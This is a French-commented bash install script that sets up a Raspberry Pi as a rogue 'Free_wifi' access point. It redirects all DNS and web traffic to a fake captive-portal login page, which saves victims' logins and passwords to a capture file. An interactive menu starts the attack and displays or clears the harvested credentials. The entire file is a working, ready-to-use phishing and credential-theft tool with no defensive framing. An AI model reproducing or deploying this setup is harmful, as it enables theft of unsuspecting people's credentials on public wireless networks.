#!/bin/bash

# R√©pertoire principal
DIR="/home/pi/pineapple"
WWW="$DIR/www"
CAPTURE="$DIR/captures"
INTERFACE_AP="wlan1"
GATEWAY="10.0.0.1"

echo "[*] Mise √† jour et installation des paquets n√©cessaires..."
sudo apt update
sudo apt install -y hostapd dnsmasq lighttpd php

echo "[*] Cr√©ation de l'arborescence..."
mkdir -p "$WWW" "$CAPTURE"

echo "[*] Configuration de dhcpcd pour ignorer $INTERFACE_AP..."
if ! grep -q "denyinterfaces $INTERFACE_AP" /etc/dhcpcd.conf; then
    echo "denyinterfaces $INTERFACE_AP" | sudo tee -a /etc/dhcpcd.conf
    sudo systemctl restart dhcpcd
fi

echo "[*] D√©sactivation du dnsmasq syst√®me (conflits)..."
sudo systemctl stop dnsmasq 2>/dev/null
sudo systemctl disable dnsmasq 2>/dev/null

echo "[*] G√©n√©ration de la page de phishing..."
cat > "$WWW/index.php" << 'EOF'
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST["login"];
    $password = $_POST["password"];
    $creds = date("Y-m-d H:i:s") . " - $login : $password\n";
    $ok = file_put_contents("/home/pi/pineapple/captures/creds.txt", $creds, FILE_APPEND);
    if ($ok === false) {
        echo "Erreur d'√©criture !";
    } else {
        header("Location: https://google.com");
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Connexion Free_wifi</title>
    <script>
        if (document.referrer === "") {
            window.location.href = "/index.php";
        }
    </script>
</head>
<body>
    <h2>Connexion au r√©seau Free_wifi</h2>
    <form method="POST">
        Login : <input type="text" name="login"><br>
        Mot de passe : <input type="password" name="password"><br>
        <input type="submit" value="Connexion">
    </form>
</body>
</html>
EOF

echo "[*] Ajout des fichiers leurres pour portail captif..."
echo "<html><meta http-equiv='refresh' content='0; url=/index.php'></html>" > "$WWW/generate_204"
cp "$WWW/generate_204" "$WWW/hotspot-detect.html"
cp "$WWW/generate_204" "$WWW/ncsi.txt"

echo "[*] G√©n√©ration de la config hostapd..."
cat > "$DIR/hostapd.conf" <<EOF
interface=$INTERFACE_AP
driver=nl80211
ssid=Free_wifi
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

echo "[*] G√©n√©ration de la config dnsmasq..."
cat > "$DIR/dnsmasq.conf" <<EOF
interface=$INTERFACE_AP
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.50,12h
address=/#/10.0.0.1
EOF

echo "[*] Cr√©ation du menu interactif pineapple_menu.sh..."
cat > "$DIR/pineapple_menu.sh" << 'EOF'
#!/bin/bash

WLAN_FAKEAP="wlan1"
GATEWAY="10.0.0.1"
DIR="/home/pi/pineapple"
CAPTURE_FILE="$DIR/captures/creds.txt"

start_pineapple() {
    echo "[*] D√©marrage du fake AP sur $WLAN_FAKEAP..."
    sudo ip link set "$WLAN_FAKEAP" down
    sudo iw dev "$WLAN_FAKEAP" set type __ap
    sudo ip addr flush dev "$WLAN_FAKEAP"
    sudo ip addr add "$GATEWAY/24" dev "$WLAN_FAKEAP"
    sudo ip link set "$WLAN_FAKEAP" up

    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
    sudo iptables -F
    sudo iptables -t nat -F
    sudo iptables -t nat -A PREROUTING -i "$WLAN_FAKEAP" -p tcp --dport 80 -j DNAT --to "$GATEWAY":80
    sudo iptables -t nat -A POSTROUTING -j MASQUERADE

    echo "[*] D√©ploiement des fichiers web..."
    sudo rm -rf /var/www/html/*
    sudo cp -r "$DIR/www/"* /var/www/html/
    sudo systemctl restart lighttpd

    sudo dnsmasq -C "$DIR/dnsmasq.conf"
    sudo hostapd "$DIR/hostapd.conf" &

    echo "[‚úî] Pineapple lanc√©. SSID : Free_wifi"
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

stop_pineapple() {
    echo "[*] Arr√™t du Pineapple..."
    sudo killall hostapd dnsmasq 2>/dev/null
    sudo iptables -F
    sudo iptables -t nat -F
    sudo ip addr flush dev "$WLAN_FAKEAP"
    sudo ip link set "$WLAN_FAKEAP" down
    sudo iw dev "$WLAN_FAKEAP" set type managed
    sudo ip link set "$WLAN_FAKEAP" up
    echo "[‚úî] Pineapple arr√™t√©."
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

show_creds() {
    echo -e "\n[üìÑ] Identifiants captur√©s :"
    if [[ -f "$CAPTURE_FILE" ]]; then
        cat "$CAPTURE_FILE"
    else
        echo "Aucun identifiant trouv√©."
    fi
    echo
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

clear_creds() {
    if [[ -f "$CAPTURE_FILE" ]]; then
        > "$CAPTURE_FILE"
        echo "[‚úî] Identifiants effac√©s."
    else
        echo "Aucun fichier √† vider."
    fi
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

while true; do
    clear
    echo "============================="
    echo "   üçç MENU PINEAPPLE RPi"
    echo "============================="
    echo "1. D√©marrer le Pineapple"
    echo "2. Arr√™ter le Pineapple"
    echo "3. Voir les identifiants captur√©s"
    echo "4. Vider les identifiants"
    echo "5. Quitter"
    echo "-----------------------------"
    read -p "Choix [1-5] : " choice

    case "$choice" in
        1) start_pineapple ;;
        2) stop_pineapple ;;
        3) show_creds ;;
        4) clear_creds ;;
        5) echo "√Ä bient√¥t !"; exit 0 ;;
        *) echo "Option invalide."; sleep 1 ;;
    esac
done
EOF

chmod +x "$DIR/pineapple_menu.sh"

echo "[*] Correction des permissions pour les captures..."
sudo chown -R www-data:www-data "$CAPTURE"
sudo chmod 755 "$CAPTURE"

echo "[‚úî] Installation termin√©e."
echo "‚û°Ô∏è Lance le menu avec : bash $DIR/pineapple_menu.sh"